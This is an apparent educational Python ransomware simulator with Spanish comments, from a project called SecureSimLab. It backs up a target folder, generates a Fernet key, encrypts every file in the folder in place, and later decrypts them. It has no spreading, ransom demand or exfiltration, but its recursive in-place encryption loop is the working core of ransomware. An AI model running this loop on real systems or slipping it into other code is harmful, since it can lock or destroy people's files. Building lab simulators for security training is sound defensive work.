# SecureSimLab - Simulador Educativo
# Archivo: ransomware_simulator.py
# Este código es parte del proyecto SecureSimLab y está diseñado solo para propósitos educativos.

import os
import sys
import logging
import json
from datetime import datetime
from cryptography.fernet import Fernet
from pathlib import Path

class RansomwareSimulator:
    """
    Simulador educativo de ransomware para análisis de seguridad.
    Solo para uso en entornos controlados de laboratorio.
    """
    
    def __init__(self, target_dir: str, backup_dir: str):
        """
        Inicializa el simulador con directorios específicos y medidas de seguridad.
        
        Args:
            target_dir (str): Directorio objetivo para la simulación
            backup_dir (str): Directorio para respaldos de seguridad
        """
        self.target_dir = Path(target_dir)
        self.backup_dir = Path(backup_dir)
        self.key = None
        self.active = False
        self.setup_logging()
        self.validate_environment()
        
    def setup_logging(self):
        """Configura el sistema de registro detallado"""
        self.logger = logging.getLogger('RansomwareSimulator')
        self.logger.setLevel(logging.INFO)
        
        # Configurar handler para archivo
        fh = logging.FileHandler('logs/simulator.log')
        fh.setLevel(logging.INFO)
        
        # Configurar handler para consola
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        
        # Formato del log
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        fh.setFormatter(formatter)
        ch.setFormatter(formatter)
        
        self.logger.addHandler(fh)
        self.logger.addHandler(ch)
        
    def validate_environment(self):
        """Valida que el entorno sea seguro y apropiado para la simulación"""
        if not self.target_dir.exists():
            raise ValueError(f"Directorio objetivo no existe: {self.target_dir}")
            
        if not self.backup_dir.exists():
            os.makedirs(self.backup_dir)
            
        self.logger.info("Entorno validado correctamente")
        
    def create_backup(self):
        """Crea respaldo de seguridad de los archivos objetivo"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_path = self.backup_dir / f"backup_{timestamp}"
        os.makedirs(backup_path)
        
        for file_path in self.target_dir.rglob('*'):
            if file_path.is_file():
                relative_path = file_path.relative_to(self.target_dir)
                backup_file = backup_path / relative_path
                os.makedirs(backup_file.parent, exist_ok=True)
                with open(file_path, 'rb') as source:
                    with open(backup_file, 'wb') as target:
                        target.write(source.read())
                        
        self.logger.info(f"Respaldo creado en: {backup_path}")
        return backup_path
        
    def generate_key(self):
        """Genera una clave de cifrado segura"""
        self.key = Fernet.generate_key()
        key_file = self.backup_dir / 'simulation_key.key'
        with open(key_file, 'wb') as f:
            f.write(self.key)
        self.logger.info("Clave de simulación generada y almacenada")
        
    def simulate_encryption(self, file_path: Path) -> bool:
        """
        Simula el cifrado de un archivo individual.
        
        Args:
            file_path (Path): Ruta del archivo a cifrar
            
        Returns:
            bool: True si la simulación fue exitosa
        """
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            fernet = Fernet(self.key)
            encrypted_data = fernet.encrypt(data)
            
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
                
            self.logger.info(f"Archivo simulado: {file_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error en simulación de {file_path}: {str(e)}")
            return False
            
    def simulate_decryption(self, file_path: Path) -> bool:
        """
        Simula el descifrado de un archivo individual.
        
        Args:
            file_path (Path): Ruta del archivo a descifrar
            
        Returns:
            bool: True si la simulación fue exitosa
        """
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            fernet = Fernet(self.key)
            decrypted_data = fernet.decrypt(data)
            
            with open(file_path, 'wb') as f:
                f.write(decrypted_data)
                
            self.logger.info(f"Archivo restaurado: {file_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error en restauración de {file_path}: {str(e)}")
            return False
            
    def start_simulation(self):
        """Inicia la simulación del ransomware"""
        if self.active:
            self.logger.warning("La simulación ya está en curso")
            return False
            
        try:
            self.logger.info("Iniciando simulación...")
            self.active = True
            
            # Crear respaldo de seguridad
            self.create_backup()
            
            # Generar clave de simulación
            self.generate_key()
            
            # Simular cifrado
            encrypted_files = []
            for file_path in self.target_dir.rglob('*'):
                if file_path.is_file():
                    if self.simulate_encryption(file_path):
                        encrypted_files.append(str(file_path))
                        
            # Guardar registro de archivos afectados
            simulation_report = {
                'timestamp': datetime.now().isoformat(),
                'encrypted_files': encrypted_files,
                'backup_location': str(self.backup_dir)
            }
            
            with open(self.backup_dir / 'simulation_report.json', 'w') as f:
                json.dump(simulation_report, f, indent=4)
                
            self.logger.info("Simulación completada exitosamente")
            return True
            
        except Exception as e:
            self.logger.error(f"Error en simulación: {str(e)}")
            self.stop_simulation()
            return False
            
    def stop_simulation(self):
        """Detiene la simulación y restaura los archivos"""
        if not self.active:
            self.logger.warning("No hay simulación activa")
            return False
            
        try:
            self.logger.info("Deteniendo simulación...")
            
            # Restaurar archivos
            for file_path in self.target_dir.rglob('*'):
                if file_path.is_file():
                    self.simulate_decryption(file_path)
                    
            self.active = False
            self.logger.info("Simulación detenida y archivos restaurados")
            return True
            
        except Exception as e:
            self.logger.error(f"Error al detener simulación: {str(e)}")
            return False
            
    def get_simulation_status(self):
        """Retorna el estado actual de la simulación"""
        return {
            'active': self.active,
            'target_directory': str(self.target_dir),
            'backup_directory': str(self.backup_dir),
            'key_available': self.key is not None
        }

if __name__ == "__main__":
    # Configurar directorios de prueba
    target_dir = "./data/test_files"
    backup_dir = "./data/backup_files"
    
    # Inicializar simulador
    simulator = RansomwareSimulator(target_dir, backup_dir)
    
    # Prueba básica
    simulator.start_simulation()
    print("\nEstado de la simulación:")
    print(json.dumps(simulator.get_simulation_status(), indent=4))
    
    # Detener simulación después de 5 segundos
    import time
    time.sleep(5)
    simulator.stop_simulation()